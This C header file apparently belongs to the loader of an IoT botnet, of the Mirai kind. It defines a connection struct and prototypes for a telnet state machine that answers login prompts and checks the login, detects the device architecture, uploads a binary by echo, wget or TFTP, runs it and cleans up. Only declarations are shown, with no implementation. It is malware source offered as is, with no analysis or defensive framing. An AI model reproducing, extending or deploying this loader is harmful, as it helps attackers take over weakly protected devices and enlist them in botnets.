#pragma once

#include <time.h>
#include <pthread.h>
#include "includes.h"
#include "telnet_info.h"

struct connection
{
    pthread_mutex_t lock;
    struct server *srv;
    struct binary *bin;
    struct telnet_info info;
    int fd, echo_load_pos, use_slash_c, echo_retries, clear_up;
    time_t last_recv;
    enum
    {
        TELNET_CLOSED,          // 0
        TELNET_CONNECTING,      // 1
        TELNET_READ_IACS,       // 2
        TELNET_USER_PROMPT,     // 3
        TELNET_PASS_PROMPT,     // 4
        TELNET_WAITPASS_PROMPT, // 5
        TELNET_CHECK_LOGIN,     // 6
        TELNET_VERIFY_LOGIN,    // 7
        //TELNET_PARSE_PS,        // 8
        TELNET_PARSE_MOUNTS,    // 8
        TELNET_READ_WRITEABLE,  // 9
        TELNET_COPY_ECHO,       // 10
        TELNET_DETECT_ARCH,     // 11
        TELNET_ARM_SUBTYPE,     // 12
        TELNET_UPLOAD_METHODS,  // 13
        TELNET_UPLOAD_ECHO,     // 14
        TELNET_UPLOAD_WGET,     // 15
        TELNET_UPLOAD_TFTP,     // 16
        TELNET_RUN_BINARY,      // 17
        TELNET_CLEANUP          // 18
    } state_telnet;
    struct
    {
        char data[512];
        int deadline;
    } output_buffer;
    uint16_t rdbuf_pos, timeout;
    BOOL open, success, retry_bin, ctrlc_retry;
    uint8_t rdbuf[8192];
};

void connection_open(struct connection *conn);
void connection_close(struct connection *conn);

int connection_consume_iacs(struct connection *conn);
int connection_consume_login_prompt(struct connection *conn);
int connection_consume_password_prompt(struct connection *conn);
int connection_consume_prompt(struct connection *conn);
int connection_consume_verify_login(struct connection *conn);
//int connection_consume_psoutput(struct connection *conn);
//int connection_consume_mounts(struct connection *conn);
//int connection_consume_written_dirs(struct connection *conn);
int connection_consume_copy_op(struct connection *conn);
int connection_consume_arch(struct connection *conn);
int connection_consume_arm_subtype(struct connection *conn);
int connection_consume_upload_methods(struct connection *conn);
int connection_upload_echo(struct connection *conn);
int connection_upload_wget(struct connection *conn);
int connection_upload_tftp(struct connection *conn);
int connection_verify_payload(struct connection *conn);
int connection_consume_cleanup(struct connection *conn);

static BOOL can_consume(struct connection *conn, uint8_t *ptr, int amount);
